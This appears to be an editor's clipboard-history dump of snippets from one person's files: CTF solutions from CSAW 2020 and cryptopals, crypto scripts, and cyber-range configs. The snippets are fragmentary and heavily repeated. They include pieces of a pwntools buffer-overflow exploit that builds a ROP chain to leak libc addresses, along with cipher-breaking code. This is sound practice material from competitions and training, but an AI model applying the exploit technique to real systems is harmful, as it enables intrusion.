	5CBBSTaJdcUgaBIxTHvDKp320QtQgkzmVSS8nTtbE+olF9B0YYrvgDw8J9WQEwlBmvlfZLIQArgX
	Cx6XFr05d3oLvFi/8V+s8iC2jCTh0i8lInfMejyN2UpQf9IvzikXt2Xb8PCrqytBOUbuUbmXrDjK
	gSOcK4VXb3ATtOEho/Zg2C3VZsO4FDx0dl90aQE+vxtGBTMJhDAM/QjnKbdJ0qHkttuNYlltc35t
	nLj/zgBJJe82kP7t8ewXUD56XKMTp0rAaBAo0DWaQGyDtSnxXS66cELTntdImUXwaQ==
	
	1+oyYt+T36z2xKt6tOkBzg3jGIvYOO+/e9jm+p4CWCPm9lOjx65+DjECDmAiVSYd5CfIvR3N5yYp
	nV0tRmZOoTWuRB9G2HaAa9yYNQj/Ixe3nyoTxGChMOMYCwiycYczXWAW3ngCHVgUZuSl/d98e03F
	Hips5o9yUb2WNjwrMr+LFscN790OQHf8ZTCoS80vgvkJnnK0+BqL4QPX9LvYof8RYLgou2Vw08Ok
	JErhtsRJ5A==
	
	xKMqY5H/zvXpl+5i4KsB8UK7FOq2cKDAe7CwrsxWWAqvtRSdgqMzNX8PQVAiD2kqpWTImFWP5xxo
	w10MHClzoGW/TQ4Vim7HNJOre0HzQlLs2glKhi71MLlQPgj3MKYzFi85mT1WfxlXZt/itZFaewiE
	Pyolr7g4X8+xMy1qMe3OXIIAu/NLFHfVJGvtOotjy6RM137OoVjek1STuI3Y/6owI/BthWs=
	
	3e84bYy9lPXEjasLtLNA+w29WbORe6jCe4aurp5cDAyruR+Ug6MrJH5BDkMiC2krsX6BgFPAsBxs
	whgdEWZyoSS5SRJcwXeFZpO4NUSzDhfu2ghHyTPlcqRdMlzscbRwEyU8ijBGfwxRI571opBJKQGI
	bGsy5rEzH4jTJypqMu3OV8dXqulLTTDUM3jmOowiwaBG2jGL9BfOxUaU9IierKs7JewoliAvlrHr
	ZwbKtoge17ttDRGfLphIkLXfH6W1071khdjYa98zQ27W8zBhds020iY7ipGxEMQl2xxw0sIyROK1
	qDYUTyiJcIAlJgM/CWGKKIH21V9fn03uEXz0kSJXROkvF81jeY3pmyhwOIeZC0dRk/FXJuYTG6BO
	XxCeDuo9YTMLvFivohiu9CC8nSj/0H0iZDK4fS2cnFlVc4EtlisKvXjH9rSjpDMOP1erAqSLty/U
	xGDIIo5BInANqOE9pPtwkSrUZs6xHmgga1Q3agEkp1ICUjYJgDBYsBnuNaEI0qzr4o+WaBZwb385
	lqf/yxVOJfF8nq3H7u4XEnsuXb9ApQXdbhZ8hCjfTniGtW2lRma5OVXJhZBOkE2xZwhe6rdH+Vrb
	tiGYTfV3+GxAB6ELm+m2ACeVjJRzF9D5w4kBnCeqBO3JU6j9ocU/AMmaB0XjMTd13Lh24kzDnOHn
	MxBHhxTfYe2ki35XEOMP9WYpYBrhcn8S0EYi7uY8Jh6vploUBDM3XGyeNMdkK3YVB+EUPWs1lSuq
	i0UMuFyqUoxik35l0T2H4KTD2C/hDuIA12nyEFjhfi1EztvK+shdVSd+wL7bLv0DDB1hy/N1w5PT
	QGtE444gnmRwvhQrZ6vUCSspwQ6FNfIASiAvTs3GWV3ei5By/6GY5s0QTC8Vh9djHGVIPXAgqJ67
	wOlVgyFR4CWpoDp+yZYfB8vUCsG07kUUVQ==
	
	xKQrad+r37Dr3uostKVG7UO6GLqNe6yGe4GuudFaHxHmulOSiO09JnRbSwJ1GWor6iqlilPArxV/
	1V0aBTZorSCvBQ4SjCfSI9y9eUyvERf7y1tHgSX9MK9WNQj3OKEzHi84ljxMOFhbM8qlsZZcdUC8
	KX5hsrU5GJ3TNS04I+vMWo8ArvVKTSPVIHT6Op5yx61NkzOcvRfYx0qWuMGa7aw2JLVhj2U80+br
	ewbXtp0B170oRA3ZbJlJnbXfE6P6yKttwMqCa/x2TmrC8ng0d8h5yD05l9LkF4wsx0pi14B+M+S5
	sjZGGyKFI8E3aAM8HnzEKdT3xAtXgwPtFCOg2DcEE/EzQoJiboqmjD4y
	
	yPU4foas0rzrmas2/KVVqEWvS+qZNa2LPJyopddBH1muugDRhu1+MX9LAAJLWHUioSqch1jAohpt
	kB4QBS9yo2vrbEsPnSuAMpS7NUG+EFz02ghAyTPgYqtZNUHxNvszOWA/mzACOx1YMtar/tEOOg6B
	bHMus/09A4rTJzUmZvHDT5MAvO9PAzPOZXTmOoVr0ehe0ivA
	
	2eYueN+136b2n+wntPURvRT8FuqscLyae5ijuM1OHxzm6kPE3rFwdEVKXVYiFWM0t2uPih3R90Ew
	glNfPCNvsGWmQBgPmSnFZs3uIBztTBfO2ghHyS31Y71ZNk2/YOUmSXJi3gFHLAwZK9v2o55JPkDU
	fD949PN8JYqAMnknI/bYT4BF76oeWG6Paz3cf552gqVMwCGPv1KLghPP7dPWrIs2M+EojCAugPDj
	bEqCptxQhOcoeRuKesxNlLKMHaq/mu8xkICeZQ==
	
	zPB9dZCtmrThm/o39bBE5FTuSL+MOe+aM5Dmu8xAGhWjtlOYlKM9PH5GTUcsWEQysCqfih2BqwZs
	0RkGSC1yqzLrUgMdjG7ZKYn+dFe6QlD11hVUyTT/MKpXfQj7Prs0BGA7m2oCHhRLI9/hqd9newOE
	Iioyo7h8BYeWZjoiJ+zFDpVFrvhaBDjTfz38cogiwaBM3juNuVuLw1Gft5SK/7AhM7V8iSQp0+Lt
	bgTS+skd3qwoQhCKa5gAnqffHaP637Nu0dDDJZIzSW7E6Hp6fcp5zyU9gJeiCoco0gZsnph9M+Wq
	oSFDUyWMboAoJxchDzPLIJC4xE5Xg0zlW3CVlnYSXucoXs1vL5Dujy88KNTfH0VHl/1WMbIQG6VZ
	Gx+cCL0hamoLvF/6pVCopja0hDH90n03YjO4fTuCkERXadI8yT0RuzaV5Liv5y4SbUnkGLOf4z7W
	jWeBJsBPIXVBpaksvv8k2DCSKM2gEHVueRotbRFnr1YIUj8PxyxDsB7yKLRJz72r4rORfVMtNkU5
	06OsghVVJb1rxeTs6OwLTT40QblSrAXBcxppynreTWGAo2DqXCL8akzWn5tIkE74KApF76ICrVOe
	+zuZV/V96TUDQegU1OmqQyiCip5iFoP6jI8ZimKnDPfSC+HoutV6WceBVQD3IDN4yals+AuUifLj
	PxRWnVY=
a026e2c852ed70329011b26b3da3b03d|file:///home/neo/CTFs/csaw2020/adversarial/script.py|21|1|V|python
	    ctr = Crypto.Util.Counter.new(128, initial_value=long(IV.encode("hex"), 16))
1609b7082873ab32e6e391539c5eadff|file:///home/neo/CTFs/csaw2020/adversarial/script.py|22|61|v|python
	encode("hex")
1f9dbed4477e017ff9113d4083225d59|file:///home/neo/CTFs/csaw2020/adversarial/script.py|5|1|V|python
	import Crypto.Cipher.AES
	import Crypto.Util.Counter
ca901bd69de21f37c6c186561b0b2346|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|7|29|v|python
	.remove('')
14ab6f2e86caf3a10c3474a556b37f4f|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|16|1|V|python
	print(byte_xor(ph, b'aaaaaaaaaaa'))
52b82bc0094025e8ac8d8ca673450d3b|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|17|1|V|python
	    for i in range(len(ciphertext) - len(ph)):
	    cirb = byte_xor(ph, st)
	    if cirb.isascii():
	        print(cirb)
b1d167ac0836e2728d87bb23eb38758b|file:///home/neo/cryptopals/set3/set3_sol.py|168|1|V|python
	    max_len = len(max(ciphertexts, key=len))
	    score_list = [0] * max_len
	    for i in range(max_len): 
	        scores = {}
	        for j in range(256):
	            scores[j] = 0
	        score_list[i] = scores
c0cc1664b4869e72b5e2e766bbf0b726|file:///home/neo/cryptopals/set3/set3_sol.py|168|1|V|python
	    max_len = len(max(ciphertexts, key=len))
	    score_list = [0] * max_len
	    for i in range(max_len): 
	        scores = {}
	        for j in range(256):
	            scores[j] = 0
	        score_list[i] = scores
	    best = [0] * max_len
	    plaintexts = [b''] * len(ciphertexts)
d6d210de0d1e64fed69d5c4924b2e866|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|16|1|V|python
	for ciphertext in ciphertexts:
6916d1eba573404fc8de190b7ac2e1b0|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|14|1|V|python
	ph = b'flag{'
ef17aa95642f8f3d8a29c2e92946c117|file:///home/neo/cryptopals/set3/set3_sol.py|7|1|V|python
	from spellchecker import SpellChecker
d0b28976b91ea5aab28854d667747fd6|file:///home/neo/cryptopals/set3/set3_sol.py|177|1|V|python
	    for ciphertext in ciphertexts:
	        for pos, c in enumerate(ciphertext):
	            for i in range(256):
	                cand = chr(c ^ i)
	                if cand.upper() in letterFrequency: 
	                    score_list[pos][i] += letterFrequency.get(cand.upper())
	    for i, score in enumerate(score_list):
	        best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	    for i, ct in enumerate(ciphertexts):
	        for pos, c in enumerate(ct):
	            decrypted_char = chr((c ^ best[pos])).lower()
	            if decrypted_char < hex(0xc0):
	                decrypted_char = '\x20'
	            plaintexts[i] += bytes(decrypted_char, 'utf-8')
b20275030ed25dd5cc61c7197a389e1d|file:///home/neo/cryptopals/set3/set3_sol.py|191|1|V|python
	    # spellchecker = SpellChecker()
	    # for i, plaintext in enumerate(plaintexts):
	    #     plaintext = plaintext.decode('utf-8')
	    #     spellchecked_pt = ''
	    #     for word in plaintext.split(' '):
	    #         new_word = word
	    #         if len(word) > 1:
	    #             new_word = spellchecker.correction(word) + ' '
	    #         spellchecked_pt += new_word
	    #     plaintexts[i] = bytes(spellchecked_pt, 'utf-8')
7b81572e41816a321d85262c0082262f|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|66|1|V|python
	spellchecker = SpellChecker()
	for i, plaintext in enumerate(plaintexts):
	    plaintext = plaintext.decode('utf-8')
	    spellchecked_pt = ''
	    for word in plaintext.split(' '):
	        new_word = word
	        if len(word) > 1:
	            new_word = spellchecker.correction(word) + ' '
	        spellchecked_pt += new_word
	    plaintexts[i] = bytes(spellchecked_pt, 'utf-8')
3ba1c46c1cd142e6470fb65146153077|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|7|1|V|python
	letterFrequency = {'E' : 12.0,
	'T' : 9.10,
	'A' : 8.12,
	'O' : 7.68,
	'I' : 7.31,
	'N' : 6.95,
	'S' : 6.28,
	'R' : 6.02,
	'H' : 5.92,
	'D' : 4.32,
	'L' : 3.98,
	'U' : 2.88,
	'C' : 2.71,
	'M' : 2.61,
	'F' : 2.30,
	'Y' : 2.11,
	'W' : 2.09,
	'G' : 2.03,
	'P' : 1.82,
	'B' : 1.49,
	'V' : 1.11,
	'K' : 0.69,
	'X' : 0.17,
	'Q' : 0.11,
	'J' : 0.10,
	'Z' : 0.07 }
	
a732253177b03def69984f9b97f74116|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|6|1|v|python
	englishLetterFreq
41863af9eceeffec8c9e4b7d1627136f|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|18|20|V|python
	for ciphertext in ciphertexts:
	    print(ciphertext)
	
3c84db659da66cbd62901224c2683c4d|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|11|v|python
	max(score.items(), key=operator.itemgetter(1))
74d6b51d47c1fe858dcab159c905a5f4|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|58|v|python
	 max(score.items(), key=operator.itemgetter(1)))
a6e0512819e55c85e03fbe2f415c6753|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|5|V|python
	    print(max(score.items(), key=operator.itemgetter(1)))
f48efca57d107b154e9cf6fdc41a8ab6|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|1|V|python
	print(best)
15fabbfe6eda4ad175b562718b2c2598|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|33|1|V|python
	for i, score in enumerate(score_list):
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
32248ee68a4abfe5bce69f0b00d67715|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|25|1|V|python
	best = [0] * max_len
66dd735e1a3a95baa51826644b6d19fe|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|40|1|V|python
	for i in range(len(best)):
52c47fe55d27003545811e668a336f8a|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|36|1|V|python
	    print(max(score.items(), key=operator.itemgetter(1))[0])
4b3fd5325c29d3c648b883e59c39cd4c|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|1|V|python
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
6604565da4766c91d6b9fda960427f70|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|41|1|V|python
	# for i, score in enumerate(score_list):
	#     second_best[i] = max(score.items(), key=operator.itemgetter(1))[0]
c71ab32d5c178d64da62cb38846cce4b|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|1|V|python
	    print('1:', max(score.items(), key=operator.itemgetter(1)))
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	    score.pop(best[i])
f44d70445031f6e03c1caa66152ad2d7|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|37|1|V|python
	    score.pop(best[i])
	    print('2:', max(score.items(), key=operator.itemgetter(1)))
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	    score.pop(best[i])
	    print('3:', max(score.items(), key=operator.itemgetter(1)))
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	    score.pop(best[i])
43fdd7cf2ef36d8942130bc0c69a0d5c|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|5|V|python
	    print('1:', max(score.items(), key=operator.itemgetter(1)))
ba505a3688a86441f6a1e4d8381aaa6f|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|50|22|v|python
	unicodce
83b3728c4f04add6ff915d5aa42ed48a|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|36|27|V|python
	    # tmp_score = max(score.items(), key=operator.itemgetter(1))[1]
	    # score.pop(best[i])
	    # new_score = max(score.items(), key=operator.itemgetter(1))[1]
	    # if new_score + 1 > tmp_score:
	    #     best[i] = max(score.items(), key=operator.itemgetter(1))[0]
9ff5cb0e68048820271e769f73112eda|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|45|1|V|python
	    print(pt.decode('utf-8'))
e17a96ceeecba2cd6f286b2183d5c045|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|46|14|v|python
	decode('utf-8'))
dcf01afd60572c4920aa931d919611a3|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|46|1|V|python
	    print(pt.strip(b'\xc3'))
91bd0d177201ff55e6d44ebb77172d1a|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|45|5|V|python
	    # print(pt.decode('utf-8'))
f56e583bdeef20dfc743f1a424acf6fd|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|45|1|V|python
	    pt = pt.replace(b'\xc3', b'')
2027cd507f289bc6240073f3a605a4e2|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|18|1|V|python
	max_len = len(max(ciphertexts, key=len))
	score_list = [0] * max_len
	for i in range(max_len): 
	    scores = {}
	    for j in range(256):
	        scores[j] = 0
	    score_list[i] = scores
	best = [0] * max_len
	second_best = [0] * max_len
	plaintexts = [b''] * len(ciphertexts)
	for ciphertext in ciphertexts:
	    for pos, c in enumerate(ciphertext):
	        for i in range(256):
	            cand = chr(c ^ i)
	            if cand.upper() in letterFrequency: 
	                score_list[pos][i] += letterFrequency.get(cand.upper())
	for i, score in enumerate(score_list):
	    best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	
	for i, ct in enumerate(ciphertexts):
	    for pos, c in enumerate(ct):
	        decrypted_char = chr((c ^ best[pos])).lower()
	        # if decrypted_char < hex(0xc0):
	        #     decrypted_char = '\x20'
	        plaintexts[i] += bytes(decrypted_char, 'utf-8')
7c3147f9ddde25c8c6b48519661a6b70|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|45|1|V|python
	    pt = pt.replace(b'\xc3', b'')
	    pt = pt.replace(b'\xc2', b'')
23ca69ae55b0edbaf0d176cc0261f893|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|46|1|V|python
	# ciphertexts = plaintexts
	
	# max_len = len(max(ciphertexts, key=len))
	# score_list = [0] * max_len
	# for i in range(max_len): 
	#     scores = {}
	#     for j in range(256):
	#         scores[j] = 0
	#     score_list[i] = scores
	# best = [0] * max_len
	# second_best = [0] * max_len
	# plaintexts = [b''] * len(ciphertexts)
	# for ciphertext in ciphertexts:
	#     for pos, c in enumerate(ciphertext):
	#         for i in range(256):
	#             cand = chr(c ^ i)
	#             if cand.upper() in letterFrequency: 
	#                 score_list[pos][i] += letterFrequency.get(cand.upper())
	# for i, score in enumerate(score_list):
	#     best[i] = max(score.items(), key=operator.itemgetter(1))[0]
	
	# for i, ct in enumerate(ciphertexts):
	#     for pos, c in enumerate(ct):
	#         decrypted_char = chr((c ^ best[pos])).lower()
	#         # if decrypted_char < hex(0xc0):
	#         #     decrypted_char = '\x20'
	#         plaintexts[i] += bytes(decrypted_char, 'utf-8')
	
	# for pt in plaintexts:
	#     print(pt)
853230a6d9cb6be2dc0db2428bcb66c0|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|42|26|v|python
	bytes(decrypted_char, 'latin-1')
772c39229a345dade0ade09a81581143|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|33|17|v|python
	score_list[pos][i] += letterFrequency.get(cand.upper())
dca47522d6b7571500b62d21d2dac3f1|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|39|v|python
	letterFrequency.get(cand.upper())
fb898d28ffee3d0e2ee7ad0a5fe89cc0|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|47|5|V|python
	for pt in plaintexts:
	    print(pt)
7b3f857ead70275c9443aea0e4c21695|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|26|1|V|python
	second_best = [0] * max_len
f7aa17b27bc39ea6a041e031b13fbbd8|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|35|17|V|python
	            else:
	                score_list[pos][i] -= 5
4b40ac563288254beffcabd9fdf33d4c|file:///home/neo/CTFs/csaw2020/adversarial/sol.py|31|13|V|python
	            if cand.isascii():
	                score_list[pos][i] += 5
618d4b6fb7dbd0a1af76f0850899cb41|file:///home/neo/CTFs/csaw2020/bards/exploit.py|77|1|V|python
	    payload = 'A' * 31
4f2e8e8354c8d8f204ecd621b9dea6c2|file:///home/neo/CTFs/csaw2020/bards/exploit.py|79|1|V|python
	    choose_alignment('g')
c3aee2b1767b8cce71519e26aad7be54|file:///home/neo/CTFs/csaw2020/bards/exploit.py|76|1|V|python
	for i in range(8):
f59d6b2a1851fb7e5d0155669b644ace|file:///home/neo/CTFs/csaw2020/bards/exploit.py|80|5|V|python
	    payload = 'A' * 10
633acf1d71f22457e0679734e4cb8d3e|file:///home/neo/CTFs/csaw2020/bards/exploit.py|83|1|V|python
	    choose_weapon('2')
	    enter_name(payload)
6f9aeb55915ea62fdef6fa2f25a41228|file:///home/neo/CTFs/csaw2020/bards/exploit.py|95|1|V|python
	for i in range(10):
	    what_to_do('e')
a251a7fa27d6526debb4fbdba8949068|file:///home/neo/CTFs/csaw2020/bards/exploit.py|77|1|V|python
	for i in range(7):
	    payload = 'A' * 10
	    choose_alignment('e')
	    choose_weapon('2')
	    enter_name(payload)
38352db5c984aafcc975da9edf4c7344|file:///home/neo/CTFs/csaw2020/bards/exploit.py|90|1|V|python
	    what_to_do('r')
9a23dbb006d463272feca42fc43a1d48|file:///home/neo/CTFs/csaw2020/bards/exploit.py|94|5|V|python
	    # what_to_do('e')
ed71cce095f0551bfec8f1f51a893d55|file:///home/neo/CTFs/csaw2020/bards/exploit.py|93|1|V|python
	for i in range(good):
	    what_to_do('r')
755f85c2723bb39381c7379a604160d8|file:///home/neo/CTFs/csaw2020/bards/exploit.py|96|16|v|python
	good
d4df28274d8b984fb11be331e148457e|file:///home/neo/CTFs/csaw2020/bards/exploit.py|88|1|V|python
	    payload = 'b' * 3
	    choose_alignment('e')
	    choose_weapon('2')
	    enter_name(payload)
43265923cf479bb1a6d31bf66fe4163f|file:///home/neo/CTFs/csaw2020/bards/exploit.py|99|11|v|python
	'b' * 24
8b1b06f6cd1e7bbe255f6de2d927a432|file:///home/neo/CTFs/csaw2020/bards/exploit.py|80|1|V|python
	MAIN = exe.sym.main
7906890ba6193ac3bc9ee44006d6f551|file:///home/neo/CTFs/csaw2020/bards/exploit.py|115|1|V|python
	# what_to_do('b')
	# io.sendline(b'c'*8)
	
	# for i in range(8):
	#     payload = 'A' * 31
	#     choose_alignment('e')
	#     choose_weapon('2')
	#     enter_name(payload)
	
	# for i in range(2):
	#     payload = 'B' * 20
	#     choose_alignment('e')
	#     choose_weapon('2')
	#     enter_name(payload)
	
	# for i in range(10):
	#     what_to_do('e')
	
c066c910ea65c60527cb6d6ec3aa353f|file:///home/neo/CTFs/csaw2020/bards/exploit.py|116|29|v|python
	.rfill(8, b'\x00')
25b4c87cc4525da45dc0563c50d1645e|file:///home/neo/CTFs/csaw2020/bards/exploit.py|118|1|V|python
	print(hex(PUTS_LIBC))
29f6a4b4913e27d3e3777aaa53fa4182|file:///home/neo/CTFs/csaw2020/bards/exploit.py|87|1|V|python
	for i in range(good):
	    payload = 'a' * 31
	    choose_alignment('g')
	    choose_weapon('2')
	    enter_name(payload)
	
	for i in range(bad):
	    payload = 'b' * 10
	    choose_alignment('e')
	    choose_weapon('2')
	    enter_name(payload)
	
	payload = p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(MAIN)[:-3]
	choose_alignment('g')
	choose_weapon('2')
	enter_name(payload)
	
	for i in range(good):
	    what_to_do('r')
	
	for i in range(bad):
	    what_to_do('e')
	
	what_to_do('r')
bb0ee9aa6f0d6640c7c7ed87cc6c01a3|file:///home/neo/CTFs/csaw2020/bards/exploit.py|138|1|V|python
	payload += p64(MAIN)[:-3]
b99e855d150070d2c9b8159e55b8a351|file:///home/neo/CTFs/csaw2020/bards/exploit.py|119|1|v|python
	libc_base
7535fc333d2b8dbb32167a96b4fc4065|file:///home/neo/CTFs/csaw2020/bards/exploit.py|136|1|V|python
	payload = p64(RET)
6cc8231782bf20cef3e97dd6199db9fb|file:///home/neo/CTFs/csaw2020/bards/exploit.py|73|1|V|python
	libc = ELF('./libc-2.27.so')
92d34d9efeeafd7de885a411ee738088|file:///home/neo/CTFs/csaw2020/bards/exploit.py|73|1|V|python
	libc = ELF('./libc-2.31.so')
b72555fdc502b53ea6d2af53cb753a0c|file:///home/neo/CTFs/csaw2020/bards/exploit.py|74|1|V|python
	libc = ''
2c13df5deaeea00030a570b95c188bd7|file:///home/neo/CTFs/csaw2020/bards/exploit.py|27|8|V|python
	        libc = ELF('./libc-2.31.so')
18d0c520d2b85371aaf86c40636e2aa9|file:///home/neo/CTFs/csaw2020/bards/exploit.py|24|9|V|python
	        libc = ELF('./libc-2.27.so')
54813fc9aef1e8311a2c6d54fbed160e|file:///home/neo/CTFs/csaw2020/bards/exploit.py|137|1|V|python
	payload += p64(RET)
85bc5b138f0be838d59eb458cbdca777|file:///home/neo/CTFs/csaw2020/bards/exploit.py|119|1|V|python
	log.info()
f9b1547a73c1e8c60ad5ffadb2c2ad05|file:///home/neo/CTFs/csaw2020/bards/exploit.py|11|29|v|python
	30029)
0ae67b159ac5f30bef1902a01f2aa9c5|file:///home/neo/CTFs/csaw2020/smallsurp/encrypted.txt|1|5|v|text
	254dc5ae7bb063ceaf3c2da953386948
dc2aa31a0991604d652ce113e8bc0399|file:///home/neo/CTFs/csaw2020/smallsurp/encrypted.txt|1|38|v|text
	08589c6b40ab64c434064ec4be41c9089eefc599603bc7441898c2e8511d03f6
125788bef80757b8ed9ea280ced06d5b|file:///home/neo/CTFs/csaw2020/bards/exploit.py|78|1|V|python
	# create 10 evil bards and try crashing
	# payload = cyclic(512, n=8)
	OFFSET = 266  # cyclic_find('aaaaabja', n=8)
	
a041c0823ccf757508cda9b89aea9ef2|file:///home/neo/CTFs/csaw2020/bards/exploit.py|86|1|V|python
	good = 1
	bad = 8
	
	for i in range(good):
	    payload = 'a' * 31
	    choose_alignment('g')
	    choose_weapon('2')
	    enter_name(payload)
	
	for i in range(bad):
	    payload = 'b' * 10
	    choose_alignment('e')
	    choose_weapon('2')
	    enter_name(payload)
	
	payload = p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(MAIN)[:-3]
	choose_alignment('g')
	choose_weapon('2')
	enter_name(payload)
	
	for i in range(good):
	    what_to_do('r')
	
	for i in range(bad):
	    what_to_do('e')
	
	what_to_do('r')
	
d457fa6977fd19a1f209e11e39fca2a2|file:///home/neo/CTFs/csaw2020/bards/exploit.py|83|1|V|python
	    payload = p64(POP_RDI)
	    payload += p64(PUTS_GOT)
	    payload += p64(PUTS_PLT)
	    payload += p64(MAIN)[:-3]
17a12dcbd62f60367f074c7a806c4836|file:///home/neo/CTFs/csaw2020/bards/exploit.py|127|7|v|python
	0x00000000004006ae
2f3cf98888ff11c83bf2cce51155689f|file:///home/neo/CTFs/csaw2020/bards/exploit.py|129|1|V|python
	for i in range(good):
	    payload = 'a' * 31
	    choose_alignment('g')
	    choose_weapon('2')
	    enter_name(payload)
	
	for i in range(bad):
	    payload = 'b' * 10
	    choose_alignment('e')
	    choose_weapon('2')
	    enter_name(payload)
59ba22bae4af9139f30d7032eacce547|file:///home/neo/CTFs/csaw2020/bards/exploit.py|135|1|V|python
	choose_alignment('g')
	choose_weapon('2')
	enter_name(payload)
	
	for i in range(good):
	    what_to_do('r')
	
	for i in range(bad):
	    what_to_do('e')
	
	what_to_do('r')
43dad923c25d9eab6f221d455d381475|file:///home/neo/CTFs/csaw2020/bards/exploit.py|70|1|V|python
	
	    for i in range(good):
	        name = 'a' * 31
	        choose_alignment('g')
	        choose_weapon('2')
	        enter_name(name)
71921bd7357483e1b9bf0d36cc014d89|file:///home/neo/CTFs/csaw2020/bards/exploit.py|87|1|V|python
	    for i in range(good):
	        what_to_do('r')
dafefc7591b40f8a9dfbe6ba1ff55762|file:///home/neo/CTFs/csaw2020/bards/exploit.py|111|1|V|python
	# create bards with payload and reach offset
ddad21b9e46259946dc0b1c79626ebf1|file:///home/neo/CTFs/csaw2020/bards/exploit.py|108|1|V|python
	POP_RDI = 0x0000000000401143
8e5c9cf0b0ff854c214e4fc0e71899f1|file:///home/neo/cyberranges/work/ssss/generate_shares.py|102|1|V|python
	def recover_secret(shares, prime=_PRIME):
	    """
	    Recover the secret from share points
	    (x, y points on the polynomial).
	    """
	    if len(shares) < 2:
	        raise ValueError("need at least two shares")
	    x_s, y_s = zip(*shares)
	    return _lagrange_interpolate(0, x_s, y_s, prime)
696342d6e840bee16259935641f9fa65|file:///home/neo/cyberranges/work/ssss/generate_shares.py|110|50|V|python
	    print('Secret:                                                     ',
	          secret)
c3c3ab19fd074b715a1aeefa7447804a|file:///home/neo/cyberranges/work/ssss/generate_shares.py|117|1|V|python
	    print('Secret recovered from minimum subset of shares:             ',
	          recover_secret(shares[:3]))
141e1fc3a36b27605ae9e034ffe63feb|file:///home/neo/cyberranges/work/ssss/generate_shares.py|117|1|V|python
	    print('Secret recovered from a different minimum subset of shares: ',
	          recover_secret(shares[-3:]))
	
321acf9e33fcfe10a9e54b721e14ab15|file:///home/neo/cyberranges/work/ssss/generate_shares.py|110|32|V|python
	    print(long_to_bytes(secret))
	    print(len(long_to_bytes(secret)))
8851559a0d8e16a2493a44215866c079|file:///home/neo/cyberranges/work/ssss/recover_secret.py|38|1|V|python
	def make_random_shares(minimum, shares, prime=_PRIME):
	    """
	    Generates a random shamir pool, returns the secret and the share
	    points.
	    """
	    if minimum > shares:
	        raise ValueError("Pool secret would be irrecoverable.")
	    poly = [_RINT(prime - 1) for i in range(minimum)]
	    points = [(i, _eval_at(poly, i, prime))
	              for i in range(1, shares + 1)]
	    return poly[0], points
	
d282715cf717411dcb03dfe7e2b171c2|file:///home/neo/cyberranges/work/ssss/recover_secret.py|103|5|V|python
	    secret, shares = make_random_shares(minimum=3, shares=6)
acd61699dbad06b33c7d3c930a12c23c|file:///home/neo/cyberranges/work/ssss/recover_secret.py|103|1|V|python
	
	    print('Secret:                                                     ',
	          secret)
	    print(long_to_bytes(secret))
	    print(len(long_to_bytes(secret)))
	    print('Shares:')
	    if shares:
	        for share in shares:
	            print('  ', share)
666d613d62bada6229e6b88734e3c572|file:///home/neo/cyberranges/work/ssss/recover_secret.py|108|29|v|python
	from minimum subset of shares:             ',
da636e4d630edd0ae56ecbc585c345d3|file:///home/neo/cyberranges/work/ssss/recover_secret.py|109|1|V|python
	    print('Secret recovered from a different minimum subset of shares: ',
	          recover_secret(shares[-3:]))
a6b2167b0ca190ff44dc53a389eaafba|file:///home/neo/cyberranges/work/ssss/recover_secret.py|108|31|v|python
	recover_secret(shares[:3])
d74323eec5603485c6dabb62792d680e|file:///home/neo/cyberranges/silensec-vpn.ovpn|19|1|V|
	up /etc/openvpn/update-systemd-resolved
	down /etc/openvpn/update-systemd-resolved
	down-pre
dab852aa53626a01051ea3ba1f4338f3|file:///home/neo/cyberranges/work/mitre/scenarios.md|2|106|v|vimwiki
	is probably not vulnerable
dd55ebab94d35d76c839ce54de9a26e9|file:///home/neo/cyberranges/work/mitre/easy8/dirtycow-docker-vdso/docker-compose.yml|2|1|V|yaml
	services:
	  dirtycow:
	    build: .
	    restart: unless-stopped
e33276c2e5c547d2952cc483825371f7|file:///home/neo/cyberranges/work/mitre/scenarios.md|2|20|v|vimwiki
	probably
87b160912e5432aa6f1fbf9a68348e52|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|5|10|v|dockerfile
